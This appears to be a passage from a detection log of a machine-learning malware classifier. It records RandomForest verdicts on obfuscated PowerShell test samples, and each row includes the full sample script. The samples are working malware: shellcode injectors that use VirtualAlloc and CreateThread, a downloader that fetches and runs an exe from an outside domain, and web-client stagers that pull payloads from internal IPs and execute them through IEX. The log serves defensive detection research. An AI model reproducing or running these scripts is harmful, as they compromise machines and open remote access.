me','0x4d,0x6c,0x62,0x11,0x7c,0x8f,0x72,0x3d,0xf7,0xfc,0x40,0x','9,0x2b,0x2a,0x34,0x3d,0x7b,0x44,0x9d,0x3e,0x10,0x94,0x22','xeb,0x8d,0x91,0xb4,0x43,0x84,0x25,0x3c,0x04',',0x4d,0xaf,0x50,0x83,0x6e,',',0xa3,0x6a,0xe8,0x6b,0x6a,0x6c','0x83,0x59,0x','32ftI -namespace Win32Func','dd,0x9c,0x85,0x80,0x2c,0xdc,','a,0x65,0x1c,0xc3,0xed,0xce,0xab,0x35,0xc','72,0xf4,0x01,0x91,0x00,0x14,0x92;Fvmg = 0x1000;if (Fvmz.Length -gt 0x1000){Fvmg = Fvmz.Length};Fvmr8k=Fvmw::VirtualAlloc','d0','yte[]];[Byte[]]Fvmz = 0xd9,0xee,0xba,0x65,0x2e,0x29,0x0e,0xd9,0x74,0x24,0xf4,0x58,0x2','x53,0x','2,0xa4,0xbb,0x0d,0xf5,0xf3,0x53,0x0c,0x20,0x33,0xf',',0x57,0x','tatic exter','vmw = Add-Type -memberDefinition Fvmr8kaDS',',0xde,0xa7,0xd2,0xa2,0xc4,0x63,0xbf,',',0xf8,0x24,0xa8,0x39,0x1b,0x8e,0x3b,0x99,0xc7,0x2f,0xef,0x7c,0x83,0','x26,0','Ptr lpThreadId','x3a,0x6a,0xe8,0xb6,0x6c,0xe0','x23,0x44,0x0a,0xcb,0x27,0x5b,0xdf,0x67,0','75','c,0xef,0x07,0x48,0x35,0x7a,0xe','ntPtr lpAddress, uint dwSize, uin','Attributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, Int','t flAllocationType, uint flProtect);[DllImport(ftIkernel32.dllftI)]public stati',',0x3','gth-1);Fvmi++) {Fvmw::memset([IntPtr](Fvmr8k.ToInt32()+Fvmi), Fvmz[Fvmi], 1)};Fvmw::CreateThread(0,0,Fvmr8k,0,0','0xfb',',0x16','0xc2,0x26,0xcf,0xab,0x3a,0x55,0x72,0xac','e2',',0x4a,0x77,','.dllftI)]public static extern IntPtr VirtualAlloc(I','ee,0x50','xf0,0x56,0xd6,0xd1,0x7d,0x45,0x8e,0x11,0xc8,0x37,0x18,0x2d,0xe6,0x5',' -Name ','x71,0xcc,0xdc,0xf2,0x91,0x92,0x1f,0x0b,0x61,0xf3,0x96,0x','88,0xa3,0xbc,0x9d,0x60,0xe4,0x10,0x5d,0xd1,0x44,0xc1,0x35,0x3b,0x4b,0x3e,0x25,0x44,0x81,0x57,0xcf,0xab,0x7c,0x0f,0x67,0x55,0x25,0xdb,0x16,0x9a,0xf3,0xa1,0x18,0x10,0','8,0','c extern IntPtr CreateThread(IntPtr lpThread',',0x0f,0x46,0xca,0xe2,0xee,0x6','c2,0x83,0x86,0x2e,0xee,0x68,0xca,0xd','4,0x66,0xac,0x69,0xde,0x1d,0x2f,0xb8,0x2f,0x','(IntPtr dest, uint src, uint count);0zD;F','n In',',0xe8,0xde,0xc8,0x50,0xbb,','7,0x83,0xc0,0x04,0x31,0x50,0x14,0x03,0x50,0','8,0x01,0x53,','0x86,0x05,0x04,0x07,0x24,0x70,0x62,0x88,0xd7','0xca,',');[DllImport(ftImsvcrt.dllftI)]public s',',0);for (;;){Start-sleep 60};','mset',' -pass','Fvmr8kaDS = 0zD[DllImport(ftIkernel32','ftIWin','3,0x','49,0x42,0xf7,0x64,0x05,0xf1,0xe','0xab,0x','cf,0x80,0x06,0x42,0x53,0xdb,0x5a,0xa4,0x6a,0x14,0xaf,0xa5,','thru;[B','0x71,0x64,0x35,0x65,0xd7,0x99,0x25,0xc6,0x88,0x3f,0x2d,0xea,0xdd,','3,0xcc,0x7b,0x','tions','0x29,0x74,0x7b,0x26,0x22,0x2f,0x5b,0xc8,0xe7,0x5b,0xd2,0xd2,0xe')).REPlACE('Fvm',[STrINg][CHAR]36).REPlACE('0zD',[STrINg][CHAR]39).REPlACE(([CHAR]102+[CHAR]116+[CHAR]73),[STrINg][CHAR]34))",malicious,TP
2026-07-13 17:09:03,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\3145.ps1,custom-ps-ml,UNKNOWN,4e647332-e894-4ba7-8f75-3d5afba4871c,DESKTOP-BAC9DBQ,malicious,0.9933,RandomForest,2832,1863.96,".((Gv '*MdR*').nAME[3,11,2]-joIN'') ( ((\""{43}{38}{41}{4}{11}{0}{26}{39}{33}{13}{2}{44}{22}{45}{14}{21}{32}{8}{19}{28}{37}{17}{35}{42}{12}{16}{30}{9}{7}{31}{36}{10}{46}{34}{18}{15}{1}{24}{25}{27}{23}{40}{29}{20}{5}{3}{6}\"" -f'flAllocationType, uint flProtect);[DllImport(UBukernel32.dllUBu)]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCre','0,0x10,0x00,0x00,0x56','ctions -passthru;[Byte[]];[B','sc[zFEi], 1)};zFEw::CreateThread(0,0,zFEx,0','u)]public stati','tPtr](zFEx.ToInt32()+zFEi), zFE',',0,0);for (;;){Start-sleep 60};','f,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0',',0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x',',0x07,0xf','x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0x','c extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint ','x32,0x5f','on zFEc -Name UBuWin32UBu -namespace Win32Fun','xac,0x3c,0x61,0x7c,','68,0x0',',0x54,0x68,','x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68','xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x','3c,0x01,0','(0,0x1000,zFEsize,0x40);for (zFEi=0;zFEi -le (zFEsc.Length-1);zFEi++) {zFEw::memset([In','0x02,0x','0x31,0xd2,0x64,0x8b,0x52,','x1000;if (zFEsc.L',',0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,','0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0','ationFlags, IntPtr lpThreadId);[DllImport(','xec,0xc3;zFEsize = 0','x','ze = zFEsc.Length};zFEx=zFEw::VirtualAlloc','0x4c,0x77,0x26','x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0','2c,0x20,0xc1,0xcf,0x0d','r dest, uint src, uint count);6m5;zFEw = Add-Type -memberDefiniti','x6a,0x04,0x56,0x57,0x68,0x02,0',',0x33,0x32,0','xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x00,0x0b,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0','d0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0','UBukernel3','UBumsvcrt.dllUBu)]public static extern IntPtr memset(IntPt','ength -gt 0x1000){zFEsi','2.dllUB','x00,0x00,0x68,0x77,0x73,0','zFEc = 6m5[DllImport(','yte[]]zFEsc = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,','0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0','c0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0')).rePlacE(([CHAr]122+[CHAr]70+[CHAr]69),'$').rePlacE(([CHAr]85+[CHAr]66+[CHAr]117),[strInG][CHAr]34).rePlacE(([CHAr]54+[CHAr]109+[CHAr]53),[strInG][CHAr]39))",malicious,TP
2026-07-13 17:09:08,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\315.ps1,custom-ps-ml,UNKNOWN,101b21b7-1de3-4cf9-bd53-ac59154d3dbb,DESKTOP-BAC9DBQ,malicious,0.9931,RandomForest,348,1733.13,". ( $enV:cOMsPEC[4,24,25]-JOin'') ( (((\""{17}{6}{18}{0}{3}{13}{1}{5}{8}{20}{10}{15}{12}{4}{2}{21}{7}{22}{9}{19}{16}{14}{11}\""-f 't Sy','ent','})','stem.','le.exe{0',').Do','-Obj',' ','wnloadFile({0}http://worldnit.','0','/compu','}','},{0}fleeb','Net.WebCli','e.exe{0','.exe{0','eebl','(New','ec','}fl','com',';Start-Process','{'))  -F  [char]39) )",malicious,TP
2026-07-13 17:09:22,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\3163.ps1,custom-ps-ml,UNKNOWN,4258c306-1722-4942-9ef6-1d9f572fe989,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2918,1671.93,"((\""{9}{10}{22}{40}{47}{41}{6}{39}{45}{13}{44}{17}{3}{42}{33}{28}{31}{18}{30}{8}{15}{21}{7}{48}{36}{2}{23}{38}{14}{4}{16}{5}{43}{32}{35}{37}{11}{34}{29}{19}{0}{1}{26}{46}{24}{27}{20}{25}{12}\"" -f '0x38,0xfa,0x0c,0xdb,0x2c,0x5','7,0x99,','b','mespace Win32Functions -passt',',0x68,0x68,0x6c,0xa0,0xac,0x31,0x36,0xc9,0xf5,0x9f,0x99,0xf6,0xe6,0x40,0x45,0x53,0x6c,0x6c,0x92,0x','7,0xc3,0xcf,0xf8,0xff,0x54,0xa3,0xca,0xa0','IntPtr lpThreadId);[DllImport','9,0x76,0x13,0x6e,0xa4,0xc1,0xa8,0x44,0x52,0xd0,0x78,0x95,0x9b,0x7f,0x45,0x1a,0x6e,0x81,0x81,0x9c,0x91,0xf4,0xfb,0xdf,0x','5,0xc2,0xd7,0xb7,0xad,0x37,0x','QpzHg41Eh = w1a[DllImport(Y9','Vkernel32.dllY9V)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(Y9Vkernel32.dllY9V)]public s','8f,','leep 60};','t, uint src, uint count);','0x16,0x83','af,0','ee,0x2f,0xf8,0x5','-Type -memberDefinition QpzHg41Eh -Name Y9VWin32Y9V -na','9,0xc2,0xe1,0x02,0xc9,0x19,0x36,0xe5,0xf0,0xd1,0x4b,0xe4,0x35,0x0f,0xa1,0xb4,0xee,0x5b,0x14,0x29,','0xce,','[Qpzi], 1)};Qpzw::C','xb6,0x9c,0xe9,0xa4,0xe0,0x3e,0x0b,0x69,0x9','tatic extern IntPtr CreateThre','9,0x1a,0xaf,0x8c,0xdd,0x','z.Length};QpzRqT=Qpzw::VirtualAlloc(0,0x1000,Qpzg,0x4','reateThread(0,0,QpzRqT,0,0,0);for (;;){Start-s','0xe4,0x04,0x04,0x0a,0x8d,0xaa,0x73,0x7c,0x1','0);for (Qpzi=0;Qpzi -le (Qpzz.Length-1);Qpzi++) {Qpzw::memset([IntPtr](QpzRqT.ToInt32()+Qpzi), Qpzz','x','6a,0x27,0x44,0xe0,0x6a,0xb7,0x12,0x6a,0x6b,0xdf,0xc2,','0x9b,0x16,0xa','c3,0xa6,0x2c,0x48,0x69,0x91,0x03,0x4','29,0x3a,0x9e,0x6a,0x7a,0x93,0x5e,0xdb,0x3a,0x43,0x36,0x31,0xb5,0xbc,0x26,0x3a',',0xff,0','0x1b,0x46,0xb5,0x19,0x23,0x7c,0xd0,0xa5,0xb1,0x7b,0x73,0xf2,0x2d,0x86,0xa2,0x34,0xf2,0x79,0x81,0x4f,0x3b,0xec,0x',',0x1f,0xd5,0xcc,0xd5','78,0x3c,0x00,0xb5,0xad,0xdb,0xc3,0x',',0xf6,0x8d,0x78,0x4f,0x53,0x45,0x19,0x90,0x49,0x23,0x19,0x1a,0x7e,0xd3,0xd7,0xeb,0x0b,0xc7,0x','9d,0x7c,0xa7,0xd9,','(Y9Vmsvcrt.dllY9V)]public static extern IntPtr mems','ad(IntPtr lpThreadAttributes, uint dwStac',', ','hru;[Byte[]];[Byte[]]Qpzz = 0xbf,0xfb,0x70,0xcc,0x4e,0xdb,0xc2,0xd9,0x74,0x24,0xf4,0x5a,0x31,0xc9,0xb1,0x47,0x31,0x7a,0x13,0x03,0x7a,0x13,0x83,0xc2,0xff,0x92,0x39,0xb2,0x17,0xd0,0xc2,0x4b,0xe7,0xb5,0x4b,0xae,0xd6,0xf5,0x28,0xba,0x48,0xc6,0x3b,0xee,0x64,0xad,0x6e,0x1b',',0xce,0x2b,0x66,0x28,0xc9,0xac,0x89,0x03,0xad,0x23,0x74,0xac,0xce,0x6a,0xb2,0xf8,0x9e,0x04,0x13,0x81,0x74,0xd5,0x9c,0x54,0xe0,0xd0,0x0a,0x97,0x5d,0xdb,0xc9,0x7f,0x9c,0xdc,0xcc,0xc4,0x','w1a;Qpzw = Add','et(IntPtr des','2,0x54,0x56,0x7c,0x6e,0x83,0x9e,0x0a,0x9e,0x17;Qpzg = 0x1000;if (Qpzz.Length -gt 0x1000){Qpzg = Qpz','kSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags','2c,0x0f,0x38,0xa2,0xea,0x9a,0xdb,0x04,0x')).ReplACe(([cHAR]119+[cHAR]49+[cHAR]97),[sTRiNg][cHAR]39).ReplACe(([cHAR]89+[cHAR]57+[cHAR]86),[sTRiNg][cHAR]34).ReplACe(([cHAR]81+[cHAR]112+[cHAR]122),[sTRiNg][cHAR]36) |iEX",malicious,TP
2026-07-13 17:09:27,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\3166.ps1,custom-ps-ml,UNKNOWN,0bd8b66f-070a-4d69-8a78-b3723c69cc42,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,1360,1577.72,".( ([strInG]$veRBOSePrEfeReNCe)[1,3]+'X'-JoiN'')( ((\""{41}{63}{46}{35}{39}{9}{32}{54}{67}{77}{33}{59}{2}{50}{1}{76}{24}{13}{57}{34}{18}{80}{58}{30}{56}{27}{71}{17}{21}{68}{0}{49}{64}{4}{3}{61}{37}{66}{72}{73}{62}{81}{53}{36}{23}{83}{82}{60}{51}{74}{28}{14}{29}{78}{6}{8}{44}{65}{7}{43}{42}{45}{15}{79}{25}{16}{12}{70}{48}{75}{52}{69}{19}{20}{31}{10}{11}{22}{40}{55}{26}{5}{38}{47}\"" -f'YF3','WeBCl','NET','t','gen','O','{AE(N3',';[ChA',')RXi','0C','d54K.LE','N','owN','=YF3Mo','IaLS;d54K=YF','r[]]','4wc.D','GeckoYF3;d','5.0 (Windows ','01:8080/index.as','pGnE)))lwN%{d54_-bXOrd54k[d','54wc.HeaDeRs.A','G','em.NE','NT;d54u','5','-j','1.0)','WorKCreDENt','3SZ9z',';','54I++%','O',' S','/','EPoiNTMANageR]::E','s = [SYST',',d54u);d54','INYF3YF3','xpEct10','th]};IEX (d5','[S','([C','r[]]d54b=','h7','ha','Ervic',')','AdSTRIng(Gn','Us','.','aCH','/19','reDEntiAl','N','4B',' WOW64; Trident/7.0; rv:1','zilla',' 6.1','YsTEM.','NtIaLC','YF3','eFAUlt','YSteM.NeT.S','er-A','8e!u:wq}BYF3;d54i=0','WC.PRoXy = [SySTe','TInUe = 0;d54WC=NeW-OB','Dd(','2.168.1.1','lo',' like ','m','.NeT.WebREqUeST]::D','e]::DEfauLTNET','Ehttp:/','ie','Ject','1*o6&amp;jc','(d','NT','WEBPRoXY;d54wc.PROxy.C','CredE','t.')).REpLAcE('GnE',[stRing][chaR]34).REpLAcE(([chaR]108+[chaR]119+[chaR]78),'|').REpLAcE(([chaR]100+[chaR]53+[chaR]52),[stRing][chaR]36).REpLAcE('YF3',[stRing][chaR]39) )",malicious,TP
2026-07-13 17:09:32,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\3180.ps1,custom-ps-ml,UNKNOWN,5d6c29fb-7401-46dc-ad3b-536484d04c3d,DESKTOP-BAC9DBQ,malicious,0.7594,RandomForest,1689,1801.91,"&amp; ( ([sTRiNG]$veRBoSEpREfErEnCe)[1,3]+'X'-JoiN'')((((\""{72}{4}{49}{59}{81}{112}{57}{128}{44}{61}{113}{17}{115}{52}{69}{33}{77}{53}{92}{15}{27}{35}{122}{13}{125}{50}{54}{21}{131}{117}{38}{22}{94}{34}{56}{124}{43}{104}{31}{111}{132}{19}{84}{90}{26}{127}{98}{74}{10}{24}{16}{101}{55}{99}{116}{64}{14}{2}{73}{107}{118}{5}{47}{23}{41}{110}{6}{51}{123}{89}{95}{66}{65}{109}{11}{60}{82}{83}{75}{8}{86}{88}{42}{58}{39}{3}{30}{96}{1}{67}{80}{12}{71}{114}{70}{102}{62}{28}{133}{36}{93}{63}{40}{121}{20}{25}{7}{79}{48}{9}{119}{0}{76}{100}{29}{45}{78}{85}{32}{105}{126}{130}{129}{87}{97}{103}{106}{68}{108}{91}{120}{37}{46}{18}\""-f '7.10','e','aL','e815','KiWC=NeW-ObJe','.','C','Downloa','DvHd','7.88','uL','e','H','ke','i','nt','b','0',')',' [SYstEM.N','C','wc.H','Dv','enti','tWe','.','bR','/7.0; rv:1','IKiB=','x.','1ba','o','_','d','r','1.0)','c','NDv','D(','9d','R[]](I','ALC','d','iu','i','a','HDvH','CREd','ng(bPOhttp://4','cT SystEm','e','h','(','1; WOW64','ckoDvH;IKi','rOxY;IKi','-Agent','Cli','8f2b302','.NE','nT','u',']]','a','edEnT','oRKCR','eTw','436d2','I','Win','I',';IK','I','S = [SYSt','DeFa','=','9:80/i','ows NT 6.','s','DSTRi','92Dv','t','ialS;IKi','K','E','pbPO)))06y%{IKi','7','+','8','DeF','t.WE','(IKi','; Tride','H','HUse','AULtN','cf54','+%I',':','wc.','nde','P','=0;[CHaR[','Kik.LENgtH',');IKiWC.PR','-BXO',']};','EM.NE','EX ','eD','a','x','.WEb','=DvHMozilla/5.','i',' ','ProXY.Cr','Ers.AD','T','.1','B-JOI','KiW',' li','e]::','DvH,IK',' G','RIKik[','EquEsT]:','EnT;IK','i','IKi','eaD','y =','(['))-REPLaCe([ChaR]68+[ChaR]118+[ChaR]72),[ChaR]39-REPLaCe  ([ChaR]98+[ChaR]80+[ChaR]79),[ChaR]34-REPLaCe  '06y',[ChaR]124  -CrePLACE([ChaR]73+[ChaR]75+[ChaR]105),[ChaR]36))",malicious,TP
2026-07-13 17:09:39,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\3198.ps1,custom-ps-ml,UNKNOWN,30c4289a-7ae9-4134-bb01-78ff0006c09f,DESKTOP-BAC9DBQ,malicious,0.9778,RandomForest,1953,1658.49,"(((\""{139}{115}{110}{149}{71}{104}{69}{54}{158}{122}{78}{23}{27}{13}{25}{38}{20}{64}{29}{120}{72}{112}{106}{152}{125}{101}{37}{0}{153}{88}{61}{26}{45}{129}{5}{100}{84}{123}{35}{114}{118}{108}{3}{151}{33}{41}{97}{116}{17}{18}{86}{94}{28}{68}{134}{103}{22}{51}{56}{21}{117}{135}{80}{2}{52}{96}{154}{57}{62}{131}{60}{43}{1}{90}{142}{34}{91}{127}{82}{89}{50}{12}{39}{47}{137}{77}{102}{73}{44}{161}{121}{145}{48}{95}{124}{36}{107}{63}{99}{49}{76}{30}{11}{119}{9}{141}{156}{113}{144}{98}{130}{132}{42}{8}{92}{160}{155}{126}{109}{75}{32}{31}{19}{53}{16}{148}{85}{157}{81}{83}{140}{136}{74}{147}{138}{46}{143}{7}{87}{67}{159}{111}{79}{58}{4}{128}{146}{70}{6}{59}{150}{14}{40}{65}{66}{10}{55}{15}{133}{93}{24}{105}\"" -f'Moz','Qu',' ',':11.0) l',')))hUA%{IG','64;','i+','0','k','DEfAuL','g','c','r','ue ','k.','EX ','G','c.He','aDeRs',')','wC',';','gent0O5','o','GR','= 0',' ','NTiN','U','W-','Ca','E','mbS&gt;d','e Geck',']','/7','.N',';IGRu=0O5',';IGR','O','L','o0O5;','_:co','Re','enTi','W','92.','x','y','a','WEbP',',I','[','J&lt;0O5;I','MaNageR]::EX','th]};I','GRu)','em.NET.','es','+%IG','b','dows NT 6.1;','W','t','=NE','e','N','nd','s','t','GRk[IGR','SER','S','CreD','DownLOAdSTrInG','YVwp','L','IGRwC.PR','C','spQ','xY =',']]IGRB','Fa','=([CHa','T','0;[','.ADd',':8080/i','5.0 (Win','ult','E',':','H;','I','(0O5','ST','SY','IGR','s;IG','i',' ','CLIENt','oxy.','-A','VicEPoIN','B-JOIn0O50O5)','EM','Et.CrEDEn','v','[*f','N','.a','T','eDEnTia','.0','TEM.','w','IGR','; r','HE]::','OBJECT Sy','s =','00','rident','Em','et.WEB','1N',':DE','R_-','OW','RK=0','E','O5L','(','er','wc.PRo','Rwc.','y;','p://1','[SYS','r[]](IG','tNE','St','168.0.4','l',' [S','bXOrI','(Qeshtt','Ri=','eT.','R','ik','.N','illa/','sT','xB','TWORkCr','chAr[','pECt1','ex','i%(Gq5','Al'))-CrEpLacE([cHaR]104+[cHaR]85+[cHaR]65),[cHaR]124  -CrEpLacE'0O5',[cHaR]39 -CrEpLacE  'cok',[cHaR]92-REPlacE 'Qes',[cHaR]34 -CrEpLacE  'IGR',[cHaR]36) |&amp; ((vaRIaBLE '*mDR*').name[3,11,2]-jOin'')",malicious,TP
2026-07-13 17:09:43,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\3207.ps1,custom-ps-ml,UNKNOWN,d06a5d4e-b287-43b0-912a-c599ff8f426c,DESKTOP-BAC9DBQ,malicious,0.9867,RandomForest,3247,1646.3,"&amp; ((GET-VaRIAblE '*MDR*').NAmE[3,11,2]-JOin'')( ((\""{17}{31}{16}{3}{19}{37}{2}{20}{4}{52}{38}{34}{53}{27}{11}{32}{47}{9}{43}{40}{0}{23}{51}{26}{48}{12}{49}{21}{6}{22}{30}{24}{14}{35}{45}{29}{1}{42}{25}{7}{36}{5}{39}{44}{8}{10}{28}{41}{46}{13}{15}{33}{18}{50}\"" -f'01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x0','f,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf','ss, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThread','t flProtect);','lic static extern ','00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,','4,0x54,0x50,0x68','x6a,',',0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;C8Usize = 0x1000;if (C8Usc.Length -gt 0','2,0x10,0x8','x1000){C8Usize = C8Usc.Length};C8Ux=C8Uw::VirtualAlloc(0,0x1000,C8Usize,0x40);for (C8Ui=0;C8Ui -le (C8Usc.Length-1);C8Ui++) {C8Uw::memset([IntPtr](C8Ux.ToInt32()+C8Ui), C8Usc[C8Ui], 1)};C8Uw::Create','x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,','x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,','-eq 8){C8Ux86 = C8Uenv:SystemRoot + WBHJ8psyswow64J8pWindowsPowerShellJ8','50,0x50,0x40,0x50','pv1.0J8ppowershellWBH;C8Ucmd = WBH-no','IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uin','C8U1 = tUZC8Uc = tUZtUZ[DllImport(WBHkernel32.dllWBH)]public st','i','[DllImport(WBHkernel32.dllWBH)]public static extern IntPtr CreateThread(IntPtr l','Id);[DllImport(WBHmsvcrt.dllWBH)]pub','0x90,0x01,0x00,0x00,0x29,0xc',',0x29,0x80,0x6b,0x','1,0','0xd5,0x50,0x50,0x','0x5f,0xff,0xd5,0x8b,0x36,0','xd6,0x31,','x64,0','Thread(0,0,C8Ux,0,0,0);for (;;){S','8,0xc0,0xa8,0x01,0x6c,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xf','00,0xff,','atic extern ','0xe2,0xf0,0','p -non','Ptr dest, uint src, uint count);tUZtUZ;C8Uw = Add-Type -memberDefinition C8Uc -Name WBHWin32WBH -namespace Win32Functions -passthru;[Byte[]];[Byte[]]C8Usc = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0',',0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,','0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x','pThreadAttributes, uint dwStackSize, IntPtr lpStartAddre','ntPtr memset(Int','0x02,0xd9,0xc8,0x5f','3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x','tart-sleep 60};tUZ;C8Ugq = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(C8U1));if([IntPtr]::Siz','0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,','b,0x42,0x',',0xff','0x05,0x6','e ','x52,0x57,0x8b,0x5','0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0','0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,',' -enc WBH;iex WBH&amp; C8Ux86 C8Ucmd C8UgqWBH}else{C8Ucmd = WBH-nop -noni -encWBH;iex WBH&amp; powershell C8Ucmd C8UgqWBH;}','xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0','I','xd2,0')).REPLAcE('WBH',[StrIng][ChAr]34).REPLAcE(([ChAr]74+[ChAr]56+[ChAr]112),'\\').REPLAcE('C8U',[StrIng][ChAr]36).REPLAcE('tUZ',[StrIng][ChAr]39) )",malicious,TP
2026-07-13 17:09:53,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\3212.ps1,custom-ps-ml,UNKNOWN,29a4c930-c501-483e-b1ba-0b78fdf94ef6,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2950,1543.62,"(((\""{51}{29}{7}{37}{64}{48}{11}{54}{24}{15}{65}{44}{21}{32}{52}{58}{25}{23}{45}{27}{13}{67}{40}{14}{41}{59}{16}{3}{31}{62}{30}{19}{49}{60}{53}{5}{33}{57}{2}{8}{42}{17}{20}{1}{46}{9}{63}{6}{34}{28}{12}{22}{47}{50}{61}{69}{39}{35}{43}{68}{0}{4}{38}{18}{55}{10}{66}{26}{56}{36}\"" -f'x85,0xf6,0x75,0xec,0xc3;VX7g = 0x1000;if (VX','68,0xea,0x0f,0xd',',0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x',',0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc','7z.Length','x5a,0x51,0xff,0','xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x7','Import(n75kernel32.dlln75)','90,0x01,0x00,0x00,','ff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0x','1000,VX7g,0x40);for (VX7i=0;VX7i -le (VX7z','rn IntPt','5,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,',']VX7z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0','52,0x0c','mset(IntPtr de','2,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a','c4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0','7z.Length};VX7KTV=VX7w::VirtualAl','5,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0','x50,0x50,0x50,0x40,0x50,0x40,0x50,0x','t src, uint count)','0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,','e Win32Function','ize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(n75msvcrt.dlln75)]public static extern IntPtr me','amespac','h-1);VX7i++) {VX7w::memset([IntPtr](VX7KTV.ToInt32()+VX7i), VX7z[VX7i], 